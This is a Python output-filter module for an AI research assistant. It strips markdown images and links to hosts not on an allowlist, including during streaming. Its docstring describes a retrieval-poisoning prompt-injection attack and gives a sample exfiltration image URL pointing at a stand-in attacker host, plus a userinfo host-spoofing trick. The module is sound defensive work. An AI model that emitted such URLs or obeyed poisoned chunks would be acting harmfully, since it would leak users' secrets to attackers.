"""Output filter: external links and images in answers only for allowlisted hosts.

A poisoned chunk can ask the model to emit ``![x](https://evil.example/?q=<secret>)``. The
browser loads images while rendering, so the URL (and whatever the model put into it) would
reach the attacker without a click. Links need a click but can carry the same payload.

:func:`filter_markdown` therefore rewrites model output before any UI sees it:

* Markdown images ``![alt](url)`` and ``![alt][ref]`` are kept only for allowlisted
  ``https``/``http`` URLs, otherwise replaced by :data:`IMAGE_REMOVED`. Reference images are
  always removed (their target is defined elsewhere and cannot be checked in place).
* Markdown links ``[text](url)`` keep only their text unless the URL is allowlisted.
* Reference definitions ``[ref]: url`` and bare URLs (``https://…``, ``www.…``) with a
  non-allowlisted host are removed (:data:`LINK_REMOVED`).
* HTML ``<img>`` tags are always removed; other tags carrying a URL lose it through the bare
  URL rule.

A host is allowed if it equals an allowlisted domain or is a subdomain of one
(``export.arxiv.org``); the host is parsed with :func:`urllib.parse.urlsplit`, so
``https://arxiv.org@evil.example/`` counts as ``evil.example``. Protocol-relative
(``//host``), ``data:``, ``javascript:`` and other schemes are never allowed.

:class:`OutputFilterSink` applies the same filter to streamed tokens, holding back any tail
that could still become a link or image, so nothing unfiltered is rendered while streaming.
"""

from __future__ import annotations

import re
from collections.abc import Iterable
from typing import Any
from urllib.parse import urlsplit

from pydantic import BaseModel

from research_assistant.events import EventSink

ALLOWED_DOMAINS: tuple[str, ...] = ("arxiv.org", "semanticscholar.org", "doi.org")

IMAGE_REMOVED = "(external image removed)"
LINK_REMOVED = "(external link removed)"

# ![alt](target "title")  /  [text](target "title"): target without spaces or in <...>.
_TARGET = r"(?:<[^<>\n]*>|[^\s()<>]*(?:\([^\s()<>]*\)[^\s()<>]*)*)"
_TITLE = r"(?:\s+(?:\"[^\"\n]*\"|'[^'\n]*'|\([^()\n]*\)))?"
_INLINE_IMAGE = re.compile(r"!\[([^\[\]\n]*)\]\(\s*(" + _TARGET + r")" + _TITLE + r"\s*\)")
_REF_IMAGE = re.compile(r"!\[([^\[\]\n]*)\]\[[^\[\]\n]*\]")
_INLINE_LINK = re.compile(r"(?<!!)\[([^\[\]\n]*)\]\(\s*(" + _TARGET + r")" + _TITLE + r"\s*\)")
_REF_DEF = re.compile(r"^[ \t]{0,3}\[[^\[\]\n]+\]:[ \t]*(\S+).*$", re.MULTILINE)
_HTML_IMG = re.compile(r"<\s*img\b[^>]*>?", re.IGNORECASE)
_BARE_URL = re.compile(r"(?i)\b(?:[a-z][a-z0-9+.-]*://|www\.)[^\s<>\"'`]+")
_TRAILING_PUNCT = ".,;:!?)]}*_~'\""


class FilterResult(BaseModel):
    text: str
    removed_images: int = 0
    removed_links: int = 0

    @property
    def changed(self) -> bool:
        return bool(self.removed_images or self.removed_links)


def is_allowed_url(url: str, allowed: Iterable[str] = ALLOWED_DOMAINS) -> bool:
    """True for ``http(s)`` URLs whose host is an allowlisted domain or a subdomain of one."""
    url = url.strip().strip("<>")
    if url.lower().startswith("www."):
        url = "https://" + url
    try:
        parts = urlsplit(url)
        host = (parts.hostname or "").lower().rstrip(".")
    except ValueError:
        return False
    if parts.scheme.lower() not in ("http", "https") or not host:
        return False
    return any(host == d or host.endswith("." + d) for d in allowed)


def filter_markdown(text: str, allowed: Iterable[str] = ALLOWED_DOMAINS) -> FilterResult:
    """``text`` with non-allowlisted images and links removed (see module docstring)."""
    domains = tuple(allowed)
    images = 0
    links = 0

    def image(m: re.Match[str]) -> str:
        nonlocal images
        if is_allowed_url(m.group(2), domains):
            return m.group(0)
        images += 1
        return IMAGE_REMOVED

    def ref_image(m: re.Match[str]) -> str:
        nonlocal images
        images += 1
        return IMAGE_REMOVED

    def link(m: re.Match[str]) -> str:
        nonlocal links
        if is_allowed_url(m.group(2), domains):
            return m.group(0)
        links += 1
        return m.group(1)

    def ref_def(m: re.Match[str]) -> str:
        nonlocal links
        if is_allowed_url(m.group(1), domains):
            return m.group(0)
        links += 1
        return LINK_REMOVED

    def html_img(m: re.Match[str]) -> str:
        nonlocal images
        images += 1
        return IMAGE_REMOVED

    def bare(m: re.Match[str]) -> str:
        nonlocal links
        url = m.group(0)
        stripped = url.rstrip(_TRAILING_PUNCT)
        tail = url[len(stripped) :]
        if is_allowed_url(stripped, domains):
            return url
        links += 1
        return LINK_REMOVED + tail

    out = _HTML_IMG.sub(html_img, text)
    out = _INLINE_IMAGE.sub(image, out)
    out = _REF_IMAGE.sub(ref_image, out)
    out = _INLINE_LINK.sub(link, out)
    out = _REF_DEF.sub(ref_def, out)
    # Allowlisted markdown targets stay intact; the bare-URL pass only touches the rest.
    out = _sub_outside_allowed_targets(out, bare, domains)
    return FilterResult(text=out, removed_images=images, removed_links=links)


def _sub_outside_allowed_targets(text: str, repl: Any, domains: tuple[str, ...]) -> str:
    """Apply the bare-URL rule everywhere except inside allowlisted ``(...)`` targets."""
    keep: list[tuple[int, int]] = []
    for rx in (_INLINE_IMAGE, _INLINE_LINK):
        for m in rx.finditer(text):
            if is_allowed_url(m.group(2), domains):
                keep.append(m.span())
    if not keep:
        return _BARE_URL.sub(repl, text)
    keep.sort()
    out: list[str] = []
    pos = 0
    for start, end in keep:
        if start < pos:
            continue
        out.append(_BARE_URL.sub(repl, text[pos:start]))
        out.append(text[start:end])
        pos = end
    out.append(_BARE_URL.sub(repl, text[pos:]))
    return "".join(out)


# --------------------------------------------------------------------------- streaming

_OPENERS = "[<"


def _holdback_start(text: str) -> int:
    """Index from which ``text`` may still grow into a link, image, tag or URL."""
    hold = len(text)
    # The last word may be an incomplete URL.
    if text and not text[-1].isspace():
        hold = max(text.rfind(" "), text.rfind("\n"), text.rfind("\t")) + 1
    # An opener without its closing part may become a link / image / tag / definition.
    for i in range(len(text) - 1, -1, -1):
        ch = text[i]
        if ch not in _OPENERS:
            continue
        rest = text[i + 1 :]
        if ch == "<":
            if ">" not in rest:
                hold = min(hold, i)
            continue
        close = rest.find("]")
        if close == -1:
            open_at = i - 1 if i > 0 and text[i - 1] == "!" else i
            hold = min(hold, open_at)
            continue
        after = rest[close + 1 :]
        if after == "" or (after.startswith("(") and ")" not in after) or after.startswith("["):
            if after.startswith("[") and "]" in after[1:]:
                continue
            open_at = i - 1 if i > 0 and text[i - 1] == "!" else i
            hold = min(hold, open_at)
    # A trailing "!" may start an image.
    if text.endswith("!"):
        hold = min(hold, len(text) - 1)
    return hold


class OutputFilterSink:
    """Wraps a sink so streamed tokens are filtered with :func:`filter_markdown`.

    Text is forwarded in segments that end before any construct that could still become a
    link, image, tag or URL; each segment is filtered before it is forwarded. Call
    :meth:`flush` when the stream ends. ``removed`` counts what was filtered.
    """

    def __init__(self, inner: EventSink, allowed: Iterable[str] = ALLOWED_DOMAINS) -> None:
        self.inner = inner
        self.allowed = tuple(allowed)
        self.removed = 0
        self._pending = ""

    def step_started(self, step_id: str, name: str, input: Any) -> None:
        self.inner.step_started(step_id, name, input)

    def step_finished(
        self, step_id: str, output: Any, metadata: dict[str, Any] | None = None
    ) -> None:
        self.inner.step_finished(step_id, output, metadata)

    def tool_result(self, name: str, args: dict[str, Any], result: Any) -> None:
        self.inner.tool_result(name, args, result)

    def answer_ready(self, answer: Any, verifying: bool) -> None:
        self.inner.answer_ready(answer, verifying)

    def token(self, text: str) -> None:
        self._pending += text
        cut = _holdback_start(self._pending)
        if cut > 0:
            self._emit(self._pending[:cut])
            self._pending = self._pending[cut:]

    def flush(self) -> None:
        if self._pending:
            self._emit(self._pending)
            self._pending = ""

    def _emit(self, segment: str) -> None:
        res = filter_markdown(segment, self.allowed)
        self.removed += res.removed_images + res.removed_links
        if res.text:
            self.inner.token(res.text)


__all__ = [
    "ALLOWED_DOMAINS",
    "IMAGE_REMOVED",
    "LINK_REMOVED",
    "FilterResult",
    "OutputFilterSink",
    "filter_markdown",
    "is_allowed_url",
]
